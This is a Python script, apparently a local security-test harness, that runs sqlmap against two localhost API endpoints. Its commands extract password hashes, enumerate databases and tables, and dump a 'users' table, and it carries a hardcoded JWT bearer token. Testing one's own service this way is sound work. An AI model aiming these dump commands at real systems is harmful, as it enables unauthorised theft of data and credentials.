import subprocess
import os

level = 4
risk = 2
threads = 10
token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwLmxAdGF1cmkuY29tIiwiaXNzIjoiVEFVUkkiLCJpYXQiOjE3MTc5NjI3NzQsImV4cCI6MTcxODA0OTE3NH0.6blDvzuavzFY5sFgGhE2g0e-gv3uH_JMpLZTafLEdjs"
header = f'--headers="Authorization: Bearer {token}" --batch --level={level} --risk={risk} --threads={threads}'
sqlmap_directory = "C:/sqlmap"
urls = {
    'vulnerable': 'http://localhost:8882/api/vulnerable/victim?id=1',
    'sprints': 'http://localhost:8882/api/sprints?id=1'
}


# Define the SQLmap commands to execute
commands = [
    f'python sqlmap.py -u {urls["vulnerable"]} {header} --passwords',
    f'python sqlmap.py -u {urls["vulnerable"]} {header} --dbs',
    f'python sqlmap.py -u {urls["vulnerable"]} {header} --tables -D tauri',
    f'python sqlmap.py -u {urls["vulnerable"]} {header} --dump -T users -D tauri',

    f'python sqlmap.py -u {urls["sprints"]} {header} --passwords',
    f'python sqlmap.py -u {urls["sprints"]} {header} --dbs',
    f'python sqlmap.py -u {urls["sprints"]} {header} --tables -D tauri',
    f'python sqlmap.py -u {urls["sprints"]} {header} --dump -T users -D tauri',
]


os.chdir(sqlmap_directory)
# Execute each command
for i, command in enumerate(commands):
    print("\n" + "="*50)
    print(f"===================== TEST {i + 1} =====================")
    print("="*50 + "\n")
    
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(result.stdout)
    
    print("\n" + "="*50)
    print(f"================ END OF TEST {i + 1} ================")
    print("="*50 + "\n")